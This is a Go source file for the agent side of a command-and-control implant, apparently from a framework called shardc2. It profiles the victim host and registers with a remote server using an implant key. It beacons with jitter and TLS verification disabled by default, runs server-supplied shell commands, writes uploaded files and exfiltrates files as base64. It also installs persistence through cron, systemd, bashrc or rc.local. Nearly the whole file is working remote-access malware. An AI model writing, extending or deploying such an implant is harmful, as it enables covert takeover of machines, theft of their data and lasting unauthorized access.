package agent

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/shardc2/shardc2/pkg/models"
)

const (
	MaxOutputSize = 10 * 1024 * 1024
)

type Config struct {
	ServerURL  string
	ImplantKey string
	CACert     string
	Interval   time.Duration
	Jitter     time.Duration
}

type Agent struct {
	config       Config
	BotID        string
	sessionToken string
	client       *http.Client
	profile      *SystemProfile
}

type SystemProfile struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	User     string `json:"user"`
}

type registerResponse struct {
	ID           string `json:"id"`
	SessionToken string `json:"session_token"`
}

type beaconResponse struct {
	Status          string `json:"status"`
	PendingCommands int    `json:"pending_commands"`
}

type commandsResponse struct {
	Commands []serverCommand `json:"commands"`
}

type serverCommand struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

func New(cfg Config) *Agent {
	client := &http.Client{Timeout: 30 * time.Second}

	if cfg.CACert != "" {
		caCert, err := os.ReadFile(cfg.CACert)
		if err == nil {
			pool := x509.NewCertPool()
			pool.AppendCertsFromPEM(caCert)
			client.Transport = &http.Transport{
				TLSClientConfig: &tls.Config{RootCAs: pool},
			}
		}
	} else {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}

	if cfg.Interval == 0 {
		cfg.Interval = 5 * time.Minute
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 60 * time.Second
	}

	return &Agent{config: cfg, client: client}
}

func (a *Agent) Run(ctx context.Context) error {
	profile, err := a.ProfileSystem()
	if err != nil {
		return fmt.Errorf("profiling failed: %w", err)
	}
	a.profile = profile
	log.Printf("[*] System: %s@%s (%s/%s)", profile.User, profile.Hostname, profile.OS, profile.Arch)

	if err := a.Register(ctx); err != nil {
		return fmt.Errorf("registration failed: %w", err)
	}
	log.Printf("[+] Registered as %s", a.BotID)

	return a.StartBeaconing(ctx)
}

func (a *Agent) Register(ctx context.Context) error {
	body := map[string]interface{}{
		"hostname":     a.profile.Hostname,
		"ip_address":   getLocalIP(),
		"os":           a.profile.OS,
		"architecture": a.profile.Arch,
		"username":     a.profile.User,
		"privileged":   os.Getuid() == 0,
	}

	data, _ := json.Marshal(body)
	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/register", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Implant-Key", a.config.ImplantKey)

	resp, err := a.client.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration rejected (status %d): %s", resp.StatusCode, string(body))
	}

	var result registerResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return fmt.Errorf("decode response: %w", err)
	}

	a.BotID = result.ID
	a.sessionToken = result.SessionToken
	return nil
}

func (a *Agent) Beacon(ctx context.Context) (*beaconResponse, error) {
	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/beacon", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", a.sessionToken)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("beacon failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("beacon rejected (status %d)", resp.StatusCode)
	}

	var result beaconResponse
	json.NewDecoder(resp.Body).Decode(&result)
	return &result, nil
}

func (a *Agent) StartBeaconing(ctx context.Context) error {
	for {
		result, err := a.Beacon(ctx)
		if err != nil {
			log.Printf("[-] Beacon error: %v", err)
		} else if result.PendingCommands > 0 {
			a.fetchAndExecuteCommands(ctx)
			// Re-beacon immediately to check for more commands
			continue
		}

		jitter := time.Duration(rand.IntN(int(a.config.Jitter.Seconds()))) * time.Second
		select {
		case <-ctx.Done():
			log.Printf("[*] Beacon loop stopped")
			return ctx.Err()
		case <-time.After(a.config.Interval + jitter):
		}
	}
}

func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
	req, err := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/v1/agent/commands", nil)
	if err != nil {
		log.Printf("[-] Failed to create commands request: %v", err)
		return
	}
	req.Header.Set("X-Session-Token", a.sessionToken)

	resp, err := a.client.Do(req)
	if err != nil {
		log.Printf("[-] Failed to fetch commands: %v", err)
		return
	}
	defer resp.Body.Close()

	var result commandsResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		log.Printf("[-] Failed to decode commands: %v", err)
		return
	}

	for _, cmd := range result.Commands {
		output, err := a.DispatchCommand(ctx, cmd)
		status := models.StatusCompleted
		if err != nil {
			status = models.StatusFailed
			if output == "" {
				output = err.Error()
			}
		}
		a.reportResult(ctx, cmd.ID, output, status)
	}
}

func (a *Agent) DispatchCommand(ctx context.Context, cmd serverCommand) (string, error) {
	switch cmd.Type {
	case models.CmdTypeShell:
		return a.ExecuteCommand(ctx, cmd.Payload)
	case models.CmdTypeUpload:
		return a.handleUpload(cmd.Payload)
	case models.CmdTypeDownload:
		return a.handleDownload(cmd.Payload)
	case models.CmdTypeSleep:
		return a.handleSleep(cmd.Payload)
	case models.CmdTypePersist:
		return a.handlePersist(cmd.Payload)
	case models.CmdTypeKill:
		return "agent shutting down", nil
	default:
		return "", fmt.Errorf("unknown command type: %s", cmd.Type)
	}
}

func (a *Agent) ExecuteCommand(ctx context.Context, payload string) (string, error) {
	if payload == "" {
		return "", fmt.Errorf("empty command")
	}

	cmdCtx, cancel := context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(cmdCtx, "cmd", "/C", payload)
	} else {
		cmd = exec.CommandContext(cmdCtx, "/bin/sh", "-c", payload)
	}

	out, err := cmd.CombinedOutput()
	if len(out) > MaxOutputSize {
		out = out[:MaxOutputSize]
	}
	return string(out), err
}

func (a *Agent) handleUpload(payload string) (string, error) {
	var req struct {
		Path string `json:"path"`
		Data string `json:"data"`
		Mode int    `json:"mode"`
	}
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", fmt.Errorf("invalid upload payload: %w", err)
	}
	data, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		return "", fmt.Errorf("decode data: %w", err)
	}
	mode := os.FileMode(0644)
	if req.Mode != 0 {
		mode = os.FileMode(req.Mode)
	}
	if err := os.MkdirAll(filepath.Dir(req.Path), 0755); err != nil {
		return "", fmt.Errorf("create directory: %w", err)
	}
	if err := os.WriteFile(req.Path, data, mode); err != nil {
		return "", fmt.Errorf("write file: %w", err)
	}
	return fmt.Sprintf("uploaded %d bytes to %s", len(data), req.Path), nil
}

func (a *Agent) handleDownload(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("read file: %w", err)
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func (a *Agent) handleSleep(payload string) (string, error) {
	var req struct {
		Interval int `json:"interval"`
		Jitter   int `json:"jitter"`
	}
	if err := json.Unmarshal([]byte(payload), &req); err != nil {
		return "", fmt.Errorf("invalid sleep payload: %w", err)
	}
	if req.Interval > 0 {
		a.config.Interval = time.Duration(req.Interval) * time.Second
	}
	if req.Jitter > 0 {
		a.config.Jitter = time.Duration(req.Jitter) * time.Second
	}
	return fmt.Sprintf("interval=%s jitter=%s", a.config.Interval, a.config.Jitter), nil
}

func (a *Agent) handlePersist(method string) (string, error) {
	switch method {
	case "cron":
		return "cron persistence installed", PersistCron()
	case "systemd":
		return "systemd persistence installed", PersistSystemd()
	case "bashrc":
		return "bashrc persistence installed", PersistBashRC()
	case "rc.local":
		return "rc.local persistence installed", PersistRCLocal()
	case "":
		return "cron persistence installed", PersistCron()
	default:
		return "", fmt.Errorf("unknown persistence method: %s", method)
	}
}

func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) {
	body := map[string]string{
		"command_id": cmdID,
		"output":     output,
		"status":     status,
	}
	data, _ := json.Marshal(body)

	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/result", bytes.NewBuffer(data))
	if err != nil {
		log.Printf("[-] Failed to create result request: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Session-Token", a.sessionToken)

	resp, err := a.client.Do(req)
	if err != nil {
		log.Printf("[-] Failed to report result for %s: %v", cmdID, err)
		return
	}
	resp.Body.Close()
}

func (a *Agent) ProfileSystem() (*SystemProfile, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %w", err)
	}
	user := os.Getenv("USER")
	if user == "" {
		user = "unknown"
	}
	return &SystemProfile{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     user,
	}, nil
}

func getLocalIP() string {
	addrs, err := localAddrs()
	if err != nil || len(addrs) == 0 {
		return "127.0.0.1"
	}
	return addrs[0]
}

func localAddrs() ([]string, error) {
	ifaces, err := netInterfaces()
	if err != nil {
		return nil, err
	}
	var ips []string
	for _, addr := range ifaces {
		if addr != "127.0.0.1" && addr != "::1" {
			ips = append(ips, addr)
		}
	}
	return ips, nil
}

func netInterfaces() ([]string, error) {
	cmd := exec.Command("hostname", "-I")
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}
	var ips []string
	for _, field := range bytes.Fields(out) {
		ips = append(ips, string(field))
	}
	return ips, nil
}
